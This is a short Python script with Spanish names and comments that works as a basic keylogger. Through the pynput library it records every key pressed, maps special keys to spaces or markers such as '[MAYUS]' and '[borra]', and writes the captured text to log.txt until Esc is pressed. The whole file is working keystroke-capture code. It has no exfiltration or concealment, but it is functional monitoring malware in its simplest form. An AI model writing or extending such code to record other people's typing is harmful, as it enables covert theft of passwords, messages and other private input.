from pynput.keyboard import Key, Listener

keys = []

def presionar_tecla(key):
    keys.append(key)
    convertir_string(keys)


def convertir_string(keys):
    with open('log.txt','w') as logfile:
        for key in keys:
            key = str(key).replace("'", "")
            key = str(key).replace("Key.space"," ")
            key = str(key).replace("Key.enter","\n")
            key = str(key).replace("Key.shift"," ")
            key = str(key).replace("Key.alt_l"," ")
            key = str(key).replace("ñ","n")
            key = str(key).replace("Key.caps_lock"," [MAYUS]")
            key = str(key).replace("Key.delete"," ")
            key = str(key).replace("_r"," ")

                # flechas arriba abajo etc
            key = str(key).replace("Key.left","  ")
            key = str(key).replace("Key.up"," ")
            key = str(key).replace("Key.down"," ")
            key = str(key).replace("Key.right"," ")
            # Ctrl
            key = str(key).replace("Key.ctrl_l"," ")
            key = str(key).replace("x03"," ")
            key = str(key).replace("x16"," ")
            key = str(key).replace("Key.backspace"," [borra] ")
            key = str(key).replace("Key.tab"," ")

            logfile.write(key)


def soltar_tecla(key):
    if key == Key.esc:
        return False
    


with Listener(on_press = presionar_tecla, on_release = soltar_tecla) as listener:
    listener.join()



